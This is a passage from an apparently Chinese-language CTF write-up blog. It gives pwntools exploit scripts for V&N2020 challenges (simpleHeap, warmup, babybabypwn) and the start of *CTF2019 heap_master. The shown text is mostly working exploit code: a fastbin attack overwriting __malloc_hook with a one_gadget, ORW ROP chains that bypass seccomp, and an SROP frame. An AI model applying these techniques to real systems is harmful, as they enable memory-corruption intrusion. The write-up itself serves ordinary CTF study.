class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x28</span> + <span class="string">'\xE1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">'\x7F'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">'Main_Arena:\t'</span> + hex(main_arena))</span><br><span class="line">libcbase = main_arena - (libc.symbols[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span>)</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">'Malloc_Hook:\t'</span> + hex(malloc_hook))</span><br><span class="line">realloc = libcbase + <span class="number">0x846CC</span></span><br><span class="line">one_gadget = libcbase + <span class="number">0x4526A</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>) <span class="comment">#4 -&gt;2</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-8</span>) + p64(one_gadget)+p64(realloc)+<span class="string">'\n'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,<span class="string">'32'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="V-amp-N2020-公开赛-warmup"><a href="#V-amp-N2020-公开赛-warmup" class="headerlink" title="[V&amp;N2020 公开赛]warmup"></a>[V&amp;N2020 公开赛]warmup</h3><p>这题开了沙箱，然后用seccomp-tools看一下什么被禁了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/Yee/V&amp;N$ seccomp-tools dump ./vn_pwn_warmup</span><br><span class="line">This <span class="keyword">is</span> a easy challange <span class="keyword">for</span> you.</span><br><span class="line">Here <span class="keyword">is</span> my gift: <span class="number">0x7f41cd2fc690</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000024</span>  A = count &gt;&gt; <span class="number">32</span> <span class="comment"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = count <span class="comment"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  <span class="keyword">if</span> (A == <span class="number">0x10</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>发现execve被禁了，所以我们只能用orw来把flag打印出来</p><p>题目的两次输入是连着的，第二次是在第一次的前面，所以我们把orw写到第一次输入里面，在第二次输入的跳转地址处填入pop rdi，由于第一次输入的内容会pop到rdi中，在第二次输入执行完之后会执行pop rdi操作，即执行输入一里的内容，第一步是read（0，stack，0x8)，需要接收一个参数，所以我们再次发送“flag”这个字符过去。</p><p>先用read把“flag”字符读进stack的位置里面（environ是libc存储的栈地址），open的时候拿它当参数，打开文件夹，再用read把flag的内容传到stack+8的地址里</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fff6fee0268</span> —▸ <span class="number">0x7fc045b630c9</span> (__lll_unlock_wake_private+<span class="number">25</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fff6fee0270</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fff6fee0278</span> —▸ <span class="number">0x7fc045e14f40</span> (namelen) ◂— <span class="string">'flag&#123;1234567&#125;\n'</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fff6fee0280</span> —▸ <span class="number">0x7fc045b452b0</span> (write) ◂— cmp    dword ptr [rip + <span class="number">0x2d2489</span>], <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fff6fee0288</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">'aaaaaaaa'</span>)</span><br></pre></td></tr></table></figure><p>最后用write打印出来即可</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">puts_addr = int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000021102</span>+libc_base</span><br><span class="line">pop_rdx_rsi = <span class="number">0x00000000001150c9</span>+libc_base</span><br><span class="line">ret = <span class="number">0x0000000000000937</span> + libc_base</span><br><span class="line">stack_addr = libc.sym[<span class="string">'environ'</span>]  <span class="comment"># environ是libc存储的栈地址</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x8</span>) + p64(stack_addr) + p64(libc.sym[<span class="string">'read'</span>])  <span class="comment">#调用read函数，第一个参数写在了第二次输入的最后</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr+<span class="number">8</span>) + p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr+<span class="number">8</span>) + p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">payload += <span class="string">"a"</span>*(<span class="number">0x180</span>-len(payload))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x78</span> + p64(pop_rdi_ret)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">"flag\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="新增知识点"><a href="#新增知识点" class="headerlink" title="新增知识点"></a>新增知识点</h4><p>read（3,fstack+8,0x100),3是文件读入（0是键盘读入）<br>ps:flag字符如果没有’\x00’截断是不可以过的</p><h3 id="V-amp-N2020-公开赛-babybabypwn"><a href="#V-amp-N2020-公开赛-babybabypwn" class="headerlink" title="[V&amp;N2020 公开赛]babybabypwn"></a>[V&amp;N2020 公开赛]babybabypwn</h3><p>也是开了沙箱的一题</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/Yee/V&amp;N$ seccomp-tools dump ./vn_pwn_babybabypwn_1</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>题目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_1347</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to v&amp;n challange!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is my gift: 0x%llx\n"</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input magic message: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  syscall(<span class="number">15L</span>L, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这题用了srop，一下子没想起来syscall 15是干嘛用的，后来经大佬提点才发现是srop。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span> </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./vn_pwn_babybabypwn_1"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vn_pwn_babybabypwn_1"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">stack_addr = libc.sym[<span class="string">'environ'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">puts_addr = int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">stack_addr = libc.sym[<span class="string">'environ'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000021102</span> + libc_base</span><br><span class="line">pop_rdx_rsi = <span class="number">0x00000000001150c9</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000001b92</span> + libc_base</span><br><span class="line">syscall_addr = <span class="number">0x00000000000bc375</span> + libc_base</span><br><span class="line"></span><br><span class="line">srop = SigreturnFrame()   <span class="comment"># pwntools提供了Sigreturn Frame的构建</span></span><br><span class="line">srop.rax = constants.SYS_read</span><br><span class="line">srop.rdi = <span class="number">0</span></span><br><span class="line">srop.rsi = stack_addr</span><br><span class="line">srop.rdx = <span class="number">0x200</span></span><br><span class="line">srop.rsp = stack_addr + <span class="number">8</span></span><br><span class="line">srop.rip = syscall_addr</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = str(srop)[<span class="number">8</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">"flag"</span> + <span class="string">"\x00"</span>*<span class="number">4</span> + p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">shell += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr) + p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">shell += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr) + p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ps：和前一道栈题其实很像</p><h3 id="CTF2019-heap-master"><a href="#CTF2019-heap-master" class="headerlink" title="*CTF2019 heap_master"></a>*CTF2019 heap_master</h3><p>这道我用unsorted bin + global max fast +  free_hook通的（unsorted bin + IO_frush_all_lockp可能是用到栈上的地址，ret填了太多，所以一直是timeout</p><p>详细过程的话就看我<a href="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/#2019-CTF-heap-master">另一篇blog</a>吧</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> sc_expwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># p = process('./heap_master')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27915</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># self.sendline('1')</span></span><br><span class="line"><span class="comment"># self.sendline(str(size))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    <span class="comment"># if self.wait:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(content)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sendline('2')</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(offset))</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(len(content)))</span></span><br><span class="line">        <span class="comment">#     self.send(content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.sendline(str(len(content)))</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(offset)</span>:</span></span><br><span class="line"><span class="comment"># if self.wait:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># self.sendline('3')</span></span><br><span class="line"><span class="comment"># self.sendline(str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span><span class="params">(offset)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span 